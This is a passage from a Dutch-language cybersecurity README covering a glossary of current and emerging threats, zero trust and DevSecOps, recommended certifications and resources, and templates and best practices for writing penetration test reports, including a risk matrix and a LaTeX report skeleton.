- **Ransomware as a Service (RaaS)**: Ransomware als dienst
- **Double Extortion**: Dubbele afpersing
- **Supply Chain Attacks**: Toeleveringsketen aanvallen
- **Critical Infrastructure**: Aanvallen op kritieke infrastructuur

#### Cloud Security Challenges
- **Misconfigurations**: Verkeerde configuraties
- **Account Compromise**: Account overname
- **Data Breaches**: Datalekken
- **Shared Responsibility**: Gedeelde verantwoordelijkheid

### Future Threats

#### Artificial Intelligence Threats
- **AI-powered Attacks**: AI-aangedreven aanvallen
- **Deepfakes**: Vervalste media
- **Adversarial Machine Learning**: Aanvallen op ML-modellen
- **Automated Social Engineering**: Geautomatiseerde social engineering

#### Internet of Things (IoT) Security
- **Device Vulnerabilities**: Kwetsbaarheden in apparaten
- **Network Security**: Netwerkbeveiliging
- **Data Privacy**: Gegevensprivacy
- **Supply Chain Security**: Toeleveringsketen beveiliging

#### Quantum Computing Threats
- **Cryptographic Vulnerabilities**: Kwetsbaarheden in cryptografie
- **Post-quantum Cryptography**: Post-quantum cryptografie
- **Migration Planning**: Migratieplanning
- **Timeline Considerations**: Tijdlijn overwegingen

### Emerging Technologies

#### Zero Trust Architecture
- **Never Trust, Always Verify**: Nooit vertrouwen, altijd verifiëren
- **Micro-segmentation**: Micro-segmentatie
- **Identity-centric Security**: Identiteitsgerichte beveiliging
- **Continuous Monitoring**: Continue monitoring

#### DevSecOps
- **Security by Design**: Beveiliging door ontwerp
- **Automated Security Testing**: Geautomatiseerde beveiligingstests
- **Continuous Security Monitoring**: Continue beveiligingsmonitoring
- **Security as Code**: Beveiliging als code

---

## Conclusie

Cybersecurity is een complex en voortdurend evoluerend veld dat constante aandacht en bijscholing vereist. De bedreigingen worden steeds geavanceerder, en organisaties moeten proactief zijn in het implementeren van beveiligingsmaatregelen.

### Belangrijke Takeaways:
1. **Defense in Depth**: Implementeer meerdere lagen van beveiliging
2. **Risk-based Approach**: Focus op de hoogste risico's
3. **Continuous Monitoring**: Monitor systemen 24/7
4. **User Education**: Train gebruikers regelmatig
5. **Incident Response**: Houd een actueel responsplan bij
6. **Compliance**: Voldoe aan relevante regelgeving
7. **Regular Updates**: Houd systemen en software bijgewerkt
8. **Backup and Recovery**: Zorg voor goede backup- en herstelprocedures

### Aanbevolen Certificeringen:
- **CompTIA Security+**: Basis cybersecurity certificering
- **CISSP**: Geavanceerde cybersecurity certificering
- **CISM**: Information security management
- **CISA**: Information systems auditing
- **CEH**: Ethical hacking
- **OSCP**: Offensive security certified professional

### Nuttige Resources:
- **OWASP**: Web application security
- **NIST**: Cybersecurity framework
- **SANS**: Security training en resources
- **CVE**: Common vulnerabilities and exposures
- **MITRE ATT&CK**: Adversarial tactics and techniques

---

## Rapportering

### Report Structuur

#### Executive Summary
**Doel**: Management overzicht van de penetration test resultaten

**Inhoud:**
- **Test Scope**: Wat is getest
- **Methodologie**: Hoe is getest
- **Key Findings**: Belangrijkste bevindingen
- **Risk Assessment**: Risico evaluatie
- **Recommendations**: Aanbevelingen
- **Timeline**: Test tijdlijn

**Executive Summary Template:**
```
EXECUTIVE SUMMARY

1. TEST OVERVIEW
   - Test Type: [External/Internal/Web Application]
   - Scope: [Target systems and networks]
   - Duration: [Start date - End date]
   - Methodology: [Testing approach]

2. KEY FINDINGS
   - Critical: [Number] vulnerabilities
   - High: [Number] vulnerabilities
   - Medium: [Number] vulnerabilities
   - Low: [Number] vulnerabilities

3. RISK ASSESSMENT
   - Overall Risk Level: [Critical/High/Medium/Low]
   - Business Impact: [Description]
   - Likelihood: [Description]

4. RECOMMENDATIONS
   - Immediate Actions: [List]
   - Short-term Actions: [List]
   - Long-term Actions: [List]

5. NEXT STEPS
   - Remediation Timeline: [Timeline]
   - Follow-up Testing: [Planned]
   - Monitoring: [Ongoing]
```

#### Technical Findings

**Finding Template:**
```
FINDING #1: [Vulnerability Name]

Risk Level: [Critical/High/Medium/Low]
CVSS Score: [X.X]
Affected Systems: [List]

Description:
[Detailed description of the vulnerability]

Impact:
[What can an attacker do with this vulnerability]

Proof of Concept:
[Steps to reproduce the vulnerability]

Remediation:
[How to fix the vulnerability]

References:
[Links to additional information]
```

#### Risk Assessment

**Risk Matrix:**
| Likelihood | Impact | Risk Level |
|------------|--------|------------|
| High | High | Critical |
| High | Medium | High |
| High | Low | Medium |
| Medium | High | High |
| Medium | Medium | Medium |
| Medium | Low | Low |
| Low | High | Medium |
| Low | Medium | Low |
| Low | Low | Low |

**Risk Levels:**
- **Critical**: Immediate action required
- **High**: Action required within 30 days
- **Medium**: Action required within 90 days
- **Low**: Action required within 180 days

### Report Templates

#### Overleaf Template
**URL**: `https://www.overleaf.com/latex/templates/penetration-test-report-template`

**Features:**
- Professional formatting
- Customizable sections
- Risk matrix integration
- Executive summary template
- Technical findings format

#### Custom Template
```latex
\documentclass[11pt,a4paper]{article}
\usepackage[utf8]{inputenc}
\usepackage{graphicx}
\usepackage{hyperref}
\usepackage{booktabs}
\usepackage{array}

\title{Penetration Test Report}
\author{Pentest Team}
\date{\today}

\begin{document}
\maketitle

\tableofcontents

\section{Executive Summary}
[Executive summary content]

\section{Methodology}
[Testing methodology]

\section{Findings}
[Technical findings]

\section{Recommendations}
[Remediation recommendations]

\section{Appendices}
[Additional information]

\end{document}
```

### Report Best Practices

#### Good Report Examples
**Strengths:**
- Clear executive summary
- Detailed technical findings
- Risk-based prioritization
- Actionable recommendations
- Professional formatting
- Evidence-based conclusions

**Structure:**
1. Cover page
2. Table of contents
3. Executive summary
4. Methodology
5. Findings
6. Recommendations
7. Appendices

#### Bad Report Examples
**Weaknesses:**
- Vague descriptions
- No risk assessment
- Generic recommendations
- Poor formatting
- Missing evidence
- Unclear conclusions

**Common Mistakes:**
- Too technical for management
- Too generic for technical team
- Missing proof of concept
- No prioritization
- Incomplete remediation steps

### Report Delivery

#### Formats
- **PDF**: Primary delivery format
- **Word**: Editable version
- **PowerPoint**: Executive presentation
- **Excel**: Risk matrix and findings

#### Distribution
- **Executive Team**: Executive summary
- **IT Management**: Technical findings
- **Security Team**: Full report
- **Compliance**: Relevant sections

#### Follow-up
- **Remediation Tracking**: Progress monitoring
- **Re-testing**: Verification of fixes
- **Training**: Security awareness
- **Policy Updates**: Process improvements

---

*Deze README is een uitgebreide samenvatting van cybersecurity theorie en praktijk. Voor de meest actuele informatie en specifieke implementatiedetails, raadpleeg altijd de officiële documentatie en best practices van relevante organisaties.*
